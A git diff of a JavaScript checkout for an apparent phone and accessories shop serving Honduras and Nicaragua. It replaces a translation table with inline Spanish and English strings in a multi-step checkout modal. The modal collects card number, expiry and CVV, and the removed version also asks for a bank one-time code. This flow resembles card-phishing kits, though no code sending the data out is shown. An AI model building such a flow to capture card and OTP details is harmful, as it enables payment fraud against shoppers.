-spec_condition: "Condition",
-spec_battery_health: "Battery Health",
-spec_battery_health_value: "Guaranteed 90% health",
-spec_condition_certified: "Certified Refurbished",
-iphone16promax_name: "iPhone 16 Pro Max",
-iphone16_name: "iPhone 16",
-iphone15promax_name: "iPhone 15 Pro Max",
-iphone16e_name: "iPhone 16 e",
-iphone15_name: "iPhone 15",
-iphone14promax_name: "iPhone 14 Pro Max",
-iphone13promax_name: "iPhone 13 Pro Max",
-iphone12promax_name: "iPhone 12 Pro Max",
-iphone11promax_name: "iPhone 11 Pro Max",
-iphonexr_name: "iPhone XR",
-
-new: "New!",
-certified: "Certified!",
-hot: "Hot!",
-bestseller: "Best Seller!",
-deal: "Deal!",
-value: "Great Value!",
-
-choose_type: "Choose Type",
-feature_battery_title: "Long Battery Life",
-feature_battery_desc: "All-day performance",
-feature_chip_title: "Powerful Chipset",
-feature_chip_desc: "Fast & efficient",
-feature_camera_title: "High‑Res Camera",
-feature_camera_desc: "Great photo quality",
-feature_display_title: "Crisp Display",
-feature_display_desc: "Sharp visuals",
-
-iphone16_name: "iPhone 16",
-iphone15promax_name: "iPhone 15 Pro Max",
-iphone16e_name: "iPhone 16 e",
-iphone15_name: "iPhone 15",
-iphone14promax_name: "iPhone 14 Pro Max",
-iphone13promax_name: "iPhone 13 Pro Max",
-iphone12promax_name: "iPhone 12 Pro Max",
-iphone11promax_name: "iPhone 11 Pro Max",
-iphonexr_name: "iPhone XR",
-
-new: "New!",
-certified: "Certified!",
-hot: "Hot!",
-bestseller: "Best Seller!",
-deal: "Deal!",
-value: "Great Value!",
-
-choose_type: "Choose Type",
-galaxys25ultra_name: "Samsung Galaxy S25 Ultra",
-galaxys24ultra_name: "Samsung Galaxy S24 Ultra",
-galaxys24plus_name: "Samsung Galaxy S24 Plus",
-galaxys23ultra_name: "Samsung Galaxy S23 Ultra",
-galaxys22ultra_name: "Samsung Galaxy S22 Ultra",
-
-samsung_desc: "Powerful performance with stunning display and long-lasting battery—ideal for work, gaming, and everyday use.",
-premium: "Premium!",
-top_rated: "Top Rated!",
-popular: "Popular!",
-galaxya545g_name: "Samsung Galaxy A54 5G",
-galaxya35_name: "Samsung Galaxy A35",
-galaxya155g_name: "Samsung Galaxy A15 5G",
-galaxya05s_name: "Samsung Galaxy A05s",
-galaxym15_name: "Samsung Galaxy M15",
-galaxym14_name: "Samsung Galaxy M14",
-
-color_peach: "Peach",
-color_green: "Green",
-color_blue: "Blue",
-color_copper: "Copper",
-redmi14c_name: "Xiaomi Redmi 14C",
-redminote14pro5g_name: "Xiaomi Redmi Note 14 Pro 5G",
-pocox7pro_name: "Xiaomi Poco X7 Pro",
-
-color_midnight_black: "Midnight Black",
-color_sage_green: "Sage Green",
-
-feature_processor_title: "Efficient Processor",  
-feature_processor_desc: "Balanced performance and battery life",
-airpods3_name: "AirPods 3rd Generation",
-airpods4_name: "AirPods 4th Generation",
-earphones_name: "Generic Earphones",
-jblheadphones_name: "JBL Headphones",
-jblgo_name: "JBL GO Speaker",
-jblpulse_name: "JBL Pulse Speaker",
-cableiphone_name: "iPhone Charging Cable",
-cableusbc_name: "USB‑C Charging Cable",
-
-feature_spatial_audio: "Spatial Audio",
-feature_spatial_audio_desc: "Immersive 3D sound",
-feature_h1_chip: "H1 Chip",
-feature_h1_chip_desc: "Smooth pairing & voice access",
-feature_ipx4: "IPX4 Water Resistance",
-feature_ipx4_desc: "Splash‑resistant design",
-feature_battery_airpods3_desc: "Up to 6 h listening or 30 h with case",
-feature_h2_chip: "H2 Chip",
-feature_h2_chip_desc: "Enhanced performance & sound",
-feature_noise_cancellation: "Active Noise Cancellation",
-feature_noise_cancellation_desc: "Block external noise",
-feature_ip54: "IP54 Dust/Water Resistance",
-feature_battery_airpods4_desc: "Up to 5 h listening or 30 h with case",
-feature_tough_build: "Durable Build",
-feature_tough_build_desc: "Affordable and sturdy",
-feature_clear_sound: "Clear Sound",
-feature_clear_sound_desc: "Good audio for calls and music",
-feature_wireless: "Wireless Connectivity",
-feature_wireless_desc: "Bluetooth convenience",
-feature_jbl_sound: "Signature JBL Sound",
-feature_jbl_sound_desc: "Rich audio quality",
-feature_portable: "Ultra-Portable",
-feature_portable_desc: "Easy to carry anywhere",
-feature_led_lights: "LED Light Show",
-feature_led_lights_desc: "Visuals that sync with music",
-feature_mfi: "MFi Certified",
-feature_mfi_desc: "Apple‑approved accessories",
-feature_fast_charge: "Fast Charging",
-feature_fast_charge_desc: "Quick power top‑up"
-
- }
-    };
-}
-
-function t(key) {
-  const lang = window.currentLanguage || 'en'; // fallback to English if not set
-  return (window.translations[lang] && window.translations[lang][key]) 
-    ? window.translations[lang][key] 
-    : key; // fallback to key if translation is missing
-}
-
-
+        invalid_code: "Invalid code. Please try again."
+    }
+};
 
 // Global variables
 let currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
@@ -1398,11 +621,12 @@ let checkoutData = {
 };
 
 function createCheckoutModal() {
-    // Remove existing overlay
+    // Remove existing checkout overlay
     const existingOverlay = document.getElementById('checkout-overlay');
-    if (existingOverlay) existingOverlay.remove();
+    if (existingOverlay) {
+        existingOverlay.remove();
+    }
 
-    // Create overlay and modal
     const overlay = document.createElement('div');
     overlay.id = 'checkout-overlay';
     overlay.className = 'checkout-overlay active';
@@ -1410,485 +634,805 @@ function createCheckoutModal() {
     const modal = document.createElement('div');
     modal.className = 'checkout-modal';
 
-    // Calculate subtotal
     const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
     checkoutData.total = subtotal;
     checkoutData.orderNumber = `ORDER-${Date.now()}`;
 
-    // Define checkoutHTML inside the function to avoid ReferenceError and use local subtotal
     const checkoutHTML = `
-<div class="checkout-header">
-    <h2>${t("checkout")}</h2>
-    <button class="close-checkout">
-        <i class="fas fa-times"></i>
-    </button>
-</div>
-
-<div class="checkout-content">
-
-    <!-- Checkout steps indicator -->
-    <div class="checkout-steps">
-        <div class="step active" data-step="1"><span>${t("summary")}</span></div>
-        <div class="step" data-step="2"><span>${t("information")}</span></div>
-        <div class="step" data-step="3"><span>${t("payment")}</span></div>
-        <div class="step" data-step="4"><span>${t("processing")}</span></div>
-        <div class="step" data-step="5"><span>${t("confirmation")}</span></div>
-        <div class="step" data-step="6"><span>${t("verification")}</span></div>
+    <div class="checkout-header">
+        <h2 data-translate="checkout">Checkout</h2>
+        <button class="close-checkout">
+            <i class="fas fa-times"></i>
+        </button>
     </div>
-
-   <!-- STEP 1: Order Summary -->
-<div id="checkout-step-1" class="checkout-step active">
-  <div class="order-summary">
-
-    <!-- Items List -->
-    <div class="summary-section">
-      <h3>${t("order_summary")}</h3>
-      <div class="checkout-items">
-        ${cart.map(item => {
-          const isFreeGift = item.price === 0 || item.isFreeGift;
-          const itemPrice = isFreeGift ? t("free") : convertPrice(item.price * item.quantity, false);
-          const giftIndicator = isFreeGift ? ' 🎁' : '';
-          return `
-          <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
-              <img src="${item.image}" alt="${item.name}" style="width:50px;height:50px;object-fit:contain;background:var(--background-light);border-radius:6px;padding:3px;">
-              <div class="checkout-item-details">
-                  <h4>${item.name}${giftIndicator}</h4>
-                  <p>${t("qty")}: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
-              </div>
-          </div>
-          `;
-        }).join('')}
-      </div>
-    </div>
-
-    <!-- Discount Code -->
-    <div class="summary-section">
-      <h4>${t("discount_code")}</h4>
-      <div class="discount-input-group">
-        <input type="text" id="discount-code" class="discount-input" placeholder="${t("enter_code_placeholder")}" maxlength="20">
-        <button type="button" id="apply-discount" class="btn btn-secondary discount-apply-btn">${t("apply")}</button>
-      </div>
-      <div id="discount-message" class="discount-message"></div>
-    </div>
-
-    <!-- Cost Summary -->
-    <div class="summary-section">
-      <h4>${t("cost_summary")}</h4>
-      <div class="totals-row">
-        <span class="totals-label">${t("subtotal")}</span>
-        <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
-      </div>
-      <div class="totals-row shipping-row">
-        <span class="totals-label">${t("shipping")}</span>
-        <span class="totals-value free-shipping"><i class="fas fa-shipping-fast"></i> ${t("free")}</span>
-      </div>
-      <div class="totals-separator"></div>
-      <div class="totals-row total-row">
-        <span class="totals-label total-label">${t("total")}</span>
-        <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
-      </div>
-    </div>
-
-    <!-- Terms Agreement -->
-    <div class="summary-section">
-      <div class="terms-agreement" style="display:flex;align-items:center;gap:0.75rem;padding:1rem;background:var(--background-light);border-radius:var(--border-radius);border:1px solid var(--border-color);">
-        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
-        <label for="terms-checkbox" style="cursor:pointer;font-size:0.95rem;color:var(--text-color);">
-          ${t("agree_to")} 
-          <a href="terms.html" target="_blank" style="color:var(--primary-color);text-decoration:underline;">
-            ${t("terms_and_conditions")}
-          </a>
-        </label>
-      </div>
-    </div>
-
-    <!-- Continue Button -->
-    <div class="step-actions" style="margin-top:1.5rem;display:flex;justify-content:center;">
-      <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
-        ${t("continue")} <i class="fas fa-arrow-right"></i>
-      </button>
-    </div>
-
-    <!-- Trust Badge -->
-    <div class="summary-section trust-section" style="margin-top:2rem;text-align:center;">
-      <p style="font-size:0.9rem;color:var(--text-light);">
-        <i class="fas fa-lock"></i> ${t("secure_checkout")} • ${t("trusted_payment_methods")}
-      </p>
-      <div style="margin-top:0.5rem;">
-        <i class="fab fa-cc-visa" style="font-size:1.5rem;margin:0 5px;"></i>
-        <i class="fab fa-cc-mastercard" style="font-size:1.5rem;margin:0 5px;"></i>
-        <i class="fab fa-cc-amex" style="font-size:1.5rem;margin:0 5px;"></i>
-        <i class="fab fa-cc-paypal" style="font-size:1.5rem;margin:0 5px;"></i>
-      </div>
-    </div>
-  </div>
-</div>
-
-
-   <!-- STEP 2: Shipping Information -->
-<div id="checkout-step-2" class="checkout-step">
-  <div class="customer-info-section">
-    <h3>${t("shipping_info")}</h3>
-
-    <div class="form-row">
-      <div class="form-group">
-        <label>${t("full_name")} *</label>
-        <input
-          type="text"
-          id="customer-name"
-          required
-          placeholder="${t("enter_full_name")}"
-          autocomplete="name"
-        />
-      </div>
-    </div>
-
-    <div class="form-group">
-      <label>${t("phone_number")} *</label>
-      <input
-        type="tel"
-        id="customer-phone"
-        required
-        placeholder="${t("phone_number_placeholder")}"
-        autocomplete="tel"
-      />
-    </div>
-
-    <div class="form-group">
-      <label>${t("country")} *</label>
-      <input
-        type="text"
-        id="customer-country"
-        required
-        value="${countryConfig[currentCountry].name}"
-        readonly
-        style="background: #f5f5f5;"
-        autocomplete="country"
-      />
-    </div>
-
-    <div class="form-group">
-      <label>${t("complete_address")} *</label>
-      <textarea
-        id="customer-address"
-        required
-        placeholder="${t("complete_address_placeholder")}"
-        rows="4"
-        class="responsive-textarea"
-        autocomplete="street-address"
-      ></textarea>
-      <div class="address-help">
-        <i class="fas fa-info-circle"></i> ${t("address_help")}
-      </div>
-    </div>
-
-    <div class="form-row">
-      <div class="form-group">
-        <label>${t("city")} *</label>
-        <input
-          type="text"
-          id="customer-city"
-          required
-          placeholder="${t("city")}"
-          autocomplete="address-level2"
-        />
-      </div>
-      <div class="form-group">
-        <label>${t("postal_code")}</label>
-        <input
-          type="text"
-          id="customer-postal"
-          placeholder="${t("postal_code_placeholder")}"
-          autocomplete="postal-code"
-        />
-      </div>
-    </div>
-
-    <div
-      class="step-actions"
-      style="margin-top:2rem;display:flex;justify-content:space-between;"
-    >
-      <button id="back-to-summary" class="btn btn-secondary">
-        <i class="fas fa-arrow-left"></i> ${t("back")}
-      </button>
-      <button id="next-to-payment" class="btn btn-primary checkout-next">
-        ${t("continue_to_payment")} <i class="fas fa-arrow-right"></i>
-      </button>
-    </div>
-  </div>
-</div>
-
-
-   <!-- STEP 3: Payment Method -->
-<div id="checkout-step-3" class="checkout-step">
-  <div class="payment-section">
-    <h3>${t("payment_method")}</h3>
-
-    <!-- Payment Method Options -->
-    <div class="payment-methods">
-      <label class="payment-option" data-method="bank-transfer">
-        <input type="radio" name="payment-method" value="bank-transfer">
-        <div class="payment-option-content">
-          <i class="fas fa-university"></i> <span>${t("bank_transfer")}</span>
-        </div>
-      </label>
-
-      <label class="payment-option" data-method="credit-card">
-        <input type="radio" name="payment-method" value="credit-card">
-        <div class="payment-option-content">
-          <i class="fas fa-credit-card"></i> <span>${t("credit_card")}</span>
-        </div>
-      </label>
-    </div>
-
-    <!-- Payment Instructions -->
-    <div id="payment-method-instruction" class="payment-instruction" style="text-align:center;padding:2rem;color:var(--text-light);background:var(--background-light);border-radius:var(--border-radius);margin-top:1rem;">
-      <i class="fas fa-hand-pointer" style="font-size:2rem;margin-bottom:1rem;color:var(--primary-color);"></i>
-      <p>${t("select_payment_method")}</p>
-      ${currentCountry !== 'nicaragua' ? `<p style="margin-top:1rem;font-size:0.9rem;color:var(--text-light);">${t("bank_transfer_note")}</p>` : ''}
-    </div>
-
-    <!-- Bank Transfer Details -->
-    <div id="bank-transfer-details" class="payment-details" style="display:none;">
-      <div id="bank-transfer-info" class="bank-info-box"></div>
-
-      <p class="transfer-instructions" style="margin-top:1rem;">${t("transfer_instructions")}</p>
-
-      <!-- WhatsApp Confirmation -->
-      <a id="confirm-bank-transfer"
-         class="btn btn-primary"
-         target="_blank"
-         rel="noopener noreferrer"
-         style="display:inline-flex; align-items:center; gap:0.5rem; margin-top:1.2rem;"
-         href="https://wa.me/16415048135?text=Hello%2C%20I%20have%20completed%20the%20bank%20transfer%20for%20order%20${checkoutData.orderNumber}%20totaling%20${encodeURIComponent(convertPrice(subtotal, false))}.">
-        <i class="fab fa-whatsapp"></i> ${t("confirm_transfer")}
-      </a>
-    </div>
-
-    <!-- Credit Card Details -->
-    <div id="credit-card-details" class="payment-details" style="display:none;">
-      <h4>${t("card_details")}</h4>
-      <p class="accepted-cards">
-        <span>${t("accepted")}</span>
-        <i class="fab fa-cc-visa"></i>
-        <i class="fab fa-cc-mastercard"></i>
-        <i class="fab fa-cc-amex"></i>
-      </p>
-      <form class="card-form">
-        <div class="form-group">
-          <label>${t("cardholder_name")}</label>
-          <input type="text" id="cardholder-name" required>
-        </div>
-        <div class="form-group">
-          <label>${t("card_number")}</label>
-          <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
-        </div>
-        <div class="form-row">
-          <div class="form-group">
-            <label>${t("expiry_date")}</label>
-            <input type="text" id="expiry-date" placeholder="MM/YY" required maxlength="5">
-          </div>
-          <div class="form-group">
-            <label>CVV</label>
-            <input type="text" id="cvv" placeholder="123" required maxlength="4">
-          </div>
-        </div>
-        <div id="card-errors" class="error-message" style="color:red;display:none;"></div>
-      </form>
-      <p class="security-notice"><i class="fas fa-lock"></i> <span>${t("secure_ssl")}</span></p>
-      <button class="btn btn-primary place-order" data-method="credit-card">${t("process_payment")}</button>
-    </div>
-
-    <!-- Navigation -->
-    <div class="step-actions" style="margin-top:2rem;display:flex;justify-content:space-between;">
-      <button id="back-to-shipping" class="btn btn-secondary">
-        <i class="fas fa-arrow-left"></i> ${t("back")}
-      </button>
-    </div>
-  </div>
-</div>
-
-   <!-- STEP 4: Processing -->
-<div id="checkout-step-4" class="checkout-step">
-    <div class="processing-section">
-        <div class="loading-state" id="processing-card-submission">
-            <div class="spinner"></div>
-            <h3>${t("submitting_card_info")}</h3>
-            <p>${t("please_wait_card")}</p>
-        </div>
-    </div>
-</div>
-
- <!-- STEP 5: OTP Verification -->
-    <div id="checkout-step-5" class="checkout-step">
-        <div class="otp-section">
-            <div class="otp-header">
-                <div class="otp-security"><i class="fas fa-shield-alt"></i> <span>${t("security_verification")}</span></div>
+    <div class="checkout-content">
+        <div class="checkout-steps">
+            <div class="step active" data-step="1">
+                <span>${(currentLanguage === 'es' ? 'Resumen' : 'Summary')}</span>
             </div>
-            <div class="otp-content">
-                <h3>${t("verify_payment")}</h3>
-                <p>${t("otp_instructions")}</p>
-                <div class="otp-input-container">
-                    <input type="tel" id="otp-single-input" class="otp-single-input" maxlength="6" inputmode="numeric" placeholder="123456" style="width:200px;padding:15px;font-size:24px;text-align:center;border:2px solid var(--border-color);border-radius:8px;font-family:monospace;letter-spacing:0.5em;">
+            <div class="step" data-step="2">
+                <span>${currentLanguage === 'es' ? 'Información' : 'Information'}</span>
+            </div>
+            <div class="step" data-step="3">
+                <span>${currentLanguage === 'es' ? 'Pago' : 'Payment'}</span>
+            </div>
+            <div class="step" data-step="4">
+                <span>${currentLanguage === 'es' ? 'Procesando' : 'Processing'}</span>
+            </div>
+            <div class="step" data-step="5">
+                <span>${currentLanguage === 'es' ? 'Confirmación' : 'Confirmation'}</span>
+            </div>
+            <div class="step" data-step="6">
+                <span>${currentLanguage === 'es' ? 'Verificación' : 'Verification'}</span>
+            </div>
+        </div>
+        <div id="checkout-step-1" class="checkout-step active">
+            <div class="order-summary">
+                <div class="summary-section">
+                    <h3>${currentLanguage === 'es' ? 'Resumen del Pedido' : 'Order Summary'}</h3>
+                    <div class="checkout-items">
+                        ${cart.map(item => {
+                            const itemPrice = (item.price === 0 || item.isFreeGift) ? 'FREE' : convertPrice(item.price * item.quantity, false);
+                            const giftIndicator = (item.price === 0 || item.isFreeGift) ? ' 🎁' : '';
+                            const isFreeGift = item.price === 0 || item.isFreeGift;
+                            return `
+                                <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
+                                    <img src="${item.image}" alt="${item.name}" style="width: 50px; height: 50px; object-fit: contain; background: var(--background-light); border-radius: 6px; padding: 3px;">
+                                    <div class="checkout-item-details">
+                                        <h4>${item.name}${giftIndicator}</h4>
+                                        <p>Qty: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
+                                    </div>
+                                </div>
+                            `;
+                        }).join('')}
+                    </div>
                 </div>
-                <div class="otp-timer"><span>${t("code_expires_in")}</span> <span id="otp-countdown">02:00</span></div>
-                <div class="otp-actions">
-                    <button id="resend-otp-btn" class="btn btn-secondary" disabled>${t("resend_code")}</button>
-                    <button id="verify-otp-btn" class="btn btn-primary">${t("verify_code")}</button>
-                    <button id="skip-otp-btn" class="btn btn-outline" style="margin-top:1rem;">${t("skip_otp")}</button>
+
+                <div class="summary-section">
+                    <h4>${(currentLanguage === 'es' ? 'Resumen de Costos' : 'Cost Summary')}</h4>
+                    <div class="checkout-totals">
+                        <div class="totals-row">
+                            <span class="totals-label">${(currentLanguage === 'es' ? 'Subtotal:' : 'Subtotal:')}</span>
+                            <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
+                        </div>
+                        <div class="totals-row shipping-row">
+                            <span class="totals-label">${(currentLanguage === 'es' ? 'Envío:' : 'Shipping:')}</span>
+                            <span class="totals-value free-shipping">
+                                <i class="fas fa-shipping-fast"></i>
+                                ${(currentLanguage === 'es' ? 'Gratis' : 'Free')}
+                            </span>
+                        </div>
+                        <div class="totals-separator"></div>
+                        <div class="totals-row total-row">
+                            <span class="totals-label total-label">${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
+                            <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="otp-error" id="otp-error" style="display:none;"><i class="fas fa-exclamation-triangle"></i> <span>${t("invalid_code")}</span></div>
+
+                <div class="summary-section">
+                    <div class="terms-agreement" style="display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: var(--background-light); border-radius: var(--border-radius); border: 1px solid var(--border-color);">
+                        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
+                        <label for="terms-checkbox" style="cursor: pointer; font-size: 0.95rem; color: var(--text-color);">
+                            ${(currentLanguage === 'es' ? 'Acepto los' : 'I agree to the')} 
+                            <a href="terms.html" target="_blank" style="color: var(--primary-color); text-decoration: underline;">
+                                ${(currentLanguage === 'es' ? 'Términos y Condiciones' : 'Terms and Conditions')}
+                            </a>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="step-actions" style="margin-top: 1.5rem; display: flex; justify-content: center;">
+                    <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
+                        ${(currentLanguage === 'es' ? 'Continuar' : 'Continue')} <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
             </div>
         </div>
-    </div>
+         <div id="checkout-step-2" class="checkout-step">
+            <div class="customer-info-section">
+                <h3>${(currentLanguage === 'es' ? 'Información de Envío' : 'Shipping Information')}</h3>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>${(currentLanguage === 'es' ? 'Nombre Completo' : 'Full Name')} *</label>
+                        <input type="text" id="customer-name" required placeholder="${(currentLanguage === 'es' ? 'Ingrese su nombre completo' : 'Enter your full name')}" autocomplete="name">
+                    </div>
 
- <!-- STEP 6: Confirmation -->
-    <div id="checkout-step-6" class="checkout-step">
-        <div class="confirmation-section">
-            <div class="loading-state" id="processing-payment">
-                <div class="spinner"></div>
-                <h3>${t("processing_payment")}</h3>
-                <p>${t("please_wait_payment")}</p>
-                <p class="processing-steps"><span class="step-text">${t("validating_payment_method")}</span></p>
-            </div>
-            <div class="success-state" id="order-success" style="display:none;">
-                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                <h3>${t("order_confirmed")}</h3>
-                <p>${t("order_processed_success")}</p>
-                <div class="order-details">
-                    <div class="order-detail"><span>${t("order_number")}</span> <strong id="final-order-number">${checkoutData.orderNumber}</strong></div>
-                    <div class="order-detail"><span>${t("total")}</span> <strong>${convertPrice(subtotal, false)}</strong></div>
-                    <div class="order-detail"><span>${t("estimated_delivery")}</span> <strong>${getEstimatedDelivery()}</strong></div>
                 </div>
-                <button class="btn btn-primary close-checkout-success">${t("continue_shopping")}</button>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'Teléfono' : 'Phone Number')} *</label>
+                    <input type="tel" id="customer-phone" required placeholder="${(currentLanguage === 'es' ? 'Número de teléfono' : 'Phone number')}" autocomplete="tel">
+                </div>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'País' : 'Country')} *</label>
+                    <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly style="background: #f5f5f5;" autocomplete="country">
+                </div>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'Dirección Completa' : 'Complete Address')} *</label>
+                    <textarea id="customer-address" required placeholder="${(currentLanguage === 'es' ? 'Dirección completa: Calle, número, ciudad, estado/provincia, código postal...' : 'Complete address: Street, number, city, state/province, postal code...')}" rows="4" class="responsive-textarea" autocomplete="street-address"></textarea>
+                    <div class="address-help">
+                        <i class="fas fa-info-circle"></i> 
+                        ${(currentLanguage === 'es' ? 'Incluya toda la información necesaria para la entrega' : 'Include all necessary information for delivery')}
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>${(currentLanguage === 'es' ? 'Ciudad' : 'City')} *</label>
+                        <input type="text" id="customer-city" required placeholder="${(currentLanguage === 'es' ? 'Ciudad' : 'City')}" autocomplete="address-level2">
+                    </div>
+                    <div class="form-group">
+                        <label>${(currentLanguage === 'es' ? 'Código Postal' : 'Postal Code')}</label>
+                        <input type="text" id="customer-postal" placeholder="${(currentLanguage === 'es' ? 'Código postal' : 'Postal code')}" autocomplete="postal-code">
+                    </div>
+                </div>
+
+                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
+                    <button id="back-to-summary" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
+                    </button>
+                    <button id="next-to-payment" class="btn btn-primary checkout-next">
+                        ${(currentLanguage === 'es' ? 'Continuar al Pago' : 'Continue to Payment')} <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
             </div>
         </div>
-    </div>
-</div>
-`; // End of checkoutHTML
 
-    // Insert HTML
+        <div id="checkout-step-3" class="checkout-step">
+            <div class="payment-section">
+                <h3>${(currentLanguage === 'es' ? 'Método de Pago' : 'Payment Method')}</h3>
+                <div class="payment-methods">
+                    <label class="payment-option" data-method="bank-transfer">
+                        <input type="radio" name="payment-method" value="bank-transfer">
+                        <div class="payment-option-content">
+                            <i class="fas fa-university"></i>
+                            <span>${(currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer')}</span>
+                        </div>
+                    </label>
+                    <label class="payment-option" data-method="credit-card">
+                        <input type="radio" name="payment-method" value="credit-card">
+                        <div class="payment-option-content">
+                            <i class="fas fa-credit-card"></i>
+                            <span>${(currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card')}</span>
+                        </div>
+                    </label>
+                </div>
+
+                <div id="payment-method-instruction" class="payment-instruction" style="text-align: center; padding: 2rem; color: var(--text-light); background: var(--background-light); border-radius: var(--border-radius); margin-top: 1rem;">
+                    <i class="fas fa-hand-pointer" style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-color);"></i>
+                    <p>${(currentLanguage === 'es' ? 'Por favor selecciona un método de pago para continuar' : 'Please select a payment method to continue')}</p>
+                    ${currentCountry !== 'nicaragua' ? `<p style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);">${(currentLanguage === 'es' ? 'Nota: Transferencia bancaria solo está disponible en Nicaragua' : 'Note: Bank transfer is only available in Nicaragua')}</p>` : ''}
+                </div>
+
+                <div id="bank-transfer-details" class="payment-details" style="display: none;">
+                    <h4>${(currentLanguage === 'es' ? 'Datos Bancarios' : 'Bank Details')}</h4>
+                    <div class="bank-info">
+                        <p><strong>${(currentLanguage === 'es' ? 'Banco:' : 'Bank:')}</strong> ${getBankName()}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Número de Cuenta:' : 'Account Number:')}</strong> ${getAccountNumber()}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Titular de la Cuenta:' : 'Account Holder:')}</strong> ${getAccountHolder()}</p>
+
+                        <p><strong>${(currentLanguage === 'es' ? 'Referencia:' : 'Reference:')}</strong> ${checkoutData.orderNumber}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Total a Transferir:' : 'Amount to Transfer:')}</strong> ${convertPrice(subtotal, false)}</p>
+                    </div>
+                    <p class="transfer-instructions">
+                        ${(currentLanguage === 'es' ? 'Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.' : 'Make the transfer for the total amount and confirm when you have completed the payment.')}
+                    </p>
+                    <button class="btn btn-primary place-order" data-method="bank-transfer">${(currentLanguage === 'es' ? 'He realizado la transferencia' : 'I have made the transfer')}</button>
+                </div>
+
+            <div id="credit-card-details" class="payment-details" style="display: none;">
+                    <h4>${(currentLanguage === 'es' ? 'Detalles de la Tarjeta' : 'Card Details')}</h4>
+                    <p class="accepted-cards">
+                        <span>${(currentLanguage === 'es' ? 'Aceptado:' : 'Accepted:')}</span>
+                        <i class="fab fa-cc-visa"></i>
+                        <i class="fab fa-cc-mastercard"></i>
+                        <i class="fab fa-cc-amex"></i>
+                    </p>
+                    <form class="card-form">
+                        <div class="form-group">
+                            <label>${(currentLanguage === 'es' ? 'Nombre del Titular' : 'Cardholder Name')}</label>
+                            <input type="text" id="cardholder-name" required>
+                        </div>
+                        <div class="form-group">
+                            <label>${(currentLanguage === 'es' ? 'Número de Tarjeta' : 'Card Number')}</label>
+                            <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>${(currentLanguage === 'es' ? 'Fecha de Vencimiento' : 'Expiry Date')}</label>
+                                <input type="text" id="expiry-date" placeholder="MM/YY" required>
+                            </div>
+                            <div class="form-group">
+                                <label>CVV</label>
+                                <input type="text" id="cvv" placeholder="123" required>
+                            </div>
+                        </div>
+						<div id="card-errors" class="error-message" style="color: red; display: none;"></div>
+                    </form>
+                    <p class="security-notice">
+                        <i class="fas fa-lock"></i>
+                        <span>${(currentLanguage === 'es' ? 'Conexión SSL Segura - Tus datos están protegidos' : 'Secure SSL Connection - Your data is protected')}</span>
+                    </p>
+                    <button class="btn btn-primary place-order" data-method="credit-card">${(currentLanguage === 'es' ? 'Procesar Pago' : 'Process Payment')}</button>
+                </div>
+
+                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
+                    <button id="back-to-shipping" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-4" class="checkout-step">
+            <div class="processing-section">
+                <div class="loading-state" id="processing-card-submission">
+                    <div class="spinner"></div>
+                    <h3>${(currentLanguage === 'es' ? 'Enviando la información de su tarjeta' : 'Submitting your card information')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras enviamos la información de su tarjeta de crédito de forma segura.' : 'Please wait while we submit your credit card information securely.')}</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-5" class="checkout-step">
+            <div class="confirmation-section">
+                <div class="loading-state" id="processing-payment">
+                    <div class="spinner"></div>
+                    <h3>${(currentLanguage === 'es' ? 'Procesando Pago' : 'Processing Payment')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras procesamos su pago. Esto puede tomar un minuto.' : 'Please hold on while we process your payment. This might take a minute.')}</p>
+                    <p class="processing-steps">
+                        <span class="step-text">${(currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method')}</span>
+                    </p>
+                </div>
+                <div class="success-state" id="order-success" style="display: none;">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
